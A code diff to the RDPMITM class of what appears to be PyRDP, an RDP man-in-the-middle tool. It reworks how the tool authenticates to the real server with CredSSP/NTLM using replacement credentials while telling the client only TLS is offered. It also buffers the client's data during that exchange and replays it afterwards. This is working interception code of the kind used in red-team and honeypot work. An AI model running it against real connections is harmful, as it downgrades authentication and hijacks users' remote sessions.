@@ -265,16 +265,12 @@ class RDPMITM:
         After CredSSP succeeds, the server-side connection is ready for normal RDP.
         The client side gets a TLS-only response (no NLA).
         """
-        import ssl as stdlib_ssl
         import struct
-        import time
         from OpenSSL import crypto
         from impacket import ntlm as impacket_ntlm
         from impacket.spnego import SPNEGO_NegTokenInit, SPNEGO_NegTokenResp
         from Crypto.Cipher import ARC4
-        from pyrdp.security.credssp import (
-            buildTSRequest, buildTSCredentials, buildSpnegoNegTokenInit, buildSpnegoNegTokenResp
-        )
+        from pyrdp.security.credssp import buildTSRequest, buildTSCredentials
 
         log = self.getLog("credssp")
         username = self.config.replacementUsername
@@ -282,24 +278,25 @@ class RDPMITM:
         # Use domain from config or empty string
         domain = ""
 
+        # Gate client data during CredSSP to prevent MCS data from being forwarded
+        # to the server before CredSSP completes. The client (told TLS-only) will send
+        # MCS Connect Initial as soon as TLS is up, which races with our CredSSP exchange.
+        # We intercept at the segmentation layer so TPKT/FastPath data is buffered.
+        clientDataBuffer = []
+        originalSegRecv = self.client.segmentation.recv
+
+        def bufferingRecv(data: bytes):
+            clientDataBuffer.append(data)
+
+        self.client.segmentation.recv = bufferingRecv
+        log.debug("Client data gated during CredSSP exchange")
+
+        credSSPSucceeded = False
+
         # The server TLS connection is already established at this point.
         # We need to send/receive CredSSP TSRequests through the raw TLS transport.
         # Use the Twisted transport directly.
         serverTransport = self.server.tcp.transport
-
-        # Get server's TLS certificate and extract public key
-        serverCert = serverTransport.getPeerCertificate()
-        if not serverCert:
-            log.error("Cannot perform CredSSP: server certificate not available")
-            self.client.tcp.disconnect()
-            return
-
-        certDer = crypto.dump_certificate(crypto.FILETYPE_ASN1, serverCert)
-        x509cert = crypto.load_certificate(crypto.FILETYPE_ASN1, certDer)
-        pkey = x509cert.get_pubkey()
-        dump = crypto.dump_publickey(crypto.FILETYPE_ASN1, pkey)
-        serverPubKey = dump[24:]  # Strip ASN.1 header to get raw SubjectPublicKey
-        log.info("Server TLS public key: %(size)d bytes", {"size": len(serverPubKey)})
 
         NTLMSSP_OID = b'+\x06\x01\x04\x01\x827\x02\x02\n'
 
@@ -318,6 +315,20 @@ class RDPMITM:
         self.server.segmentation.addObserver(credSSPHandler)
 
         try:
+            # Get server's TLS certificate and extract public key
+            serverCert = serverTransport.getPeerCertificate()
+            if not serverCert:
+                log.error("Cannot perform CredSSP: server certificate not available")
+                self.client.tcp.disconnect()
+                return
+
+            certDer = crypto.dump_certificate(crypto.FILETYPE_ASN1, serverCert)
+            x509cert = crypto.load_certificate(crypto.FILETYPE_ASN1, certDer)
+            pkey = x509cert.get_pubkey()
+            dump = crypto.dump_publickey(crypto.FILETYPE_ASN1, pkey)
+            serverPubKey = dump[24:]  # Strip ASN.1 header to get raw SubjectPublicKey
+            log.info("Server TLS public key: %(size)d bytes", {"size": len(serverPubKey)})
+
             # Step 1: Send NTLM NEGOTIATE
             auth = impacket_ntlm.getNTLMSSPType1('', '', True, use_ntlmv2=True)
             blob = SPNEGO_NegTokenInit()
@@ -406,10 +417,18 @@ class RDPMITM:
             # Reset the ntlmCapture flag so any subsequent X224 handling works normally
             self.state.ntlmCapture = False
 
-            # Give the server a moment to process the credentials before MCS data arrives
-            import asyncio
-            await asyncio.sleep(0.5)
-            log.info("Server ready for MCS data.")
+            # Brief delay to let the server finish processing TSCredentials and
+            # transition from CredSSP mode to RDP/TPKT mode. The client data gate
+            # is still active, so any client data arriving during this sleep is
+            # safely buffered and will be replayed after the gate is released.
+            try:
+                earlyResp = await asyncio.wait_for(responseQueue.get(), timeout=0.5)
+                if earlyResp[0] == 0x30:
+                    log.warning("Server sent TSRequest after TSCredentials (possible error)")
+            except asyncio.TimeoutError:
+                pass  # Expected — server is ready for MCS
+
+            credSSPSucceeded = True
 
         except asyncio.TimeoutError:
             log.error("CredSSP exchange timed out")
@@ -420,6 +439,14 @@ class RDPMITM:
             self.client.tcp.disconnect()
         finally:
             self.server.segmentation.removeObserver(credSSPHandler)
+
+            # Release client data gate and replay any buffered data
+            self.client.segmentation.recv = originalSegRecv
+            if credSSPSucceeded and clientDataBuffer:
+                log.info("Releasing client data gate — replaying %(count)d buffered segment(s)",
+                         {"count": len(clientDataBuffer)})
+                for buffered in clientDataBuffer:
+                    originalSegRecv(buffered)
 
     def startTLS(self, onTlsReady: typing.Callable[[], None]):
         """
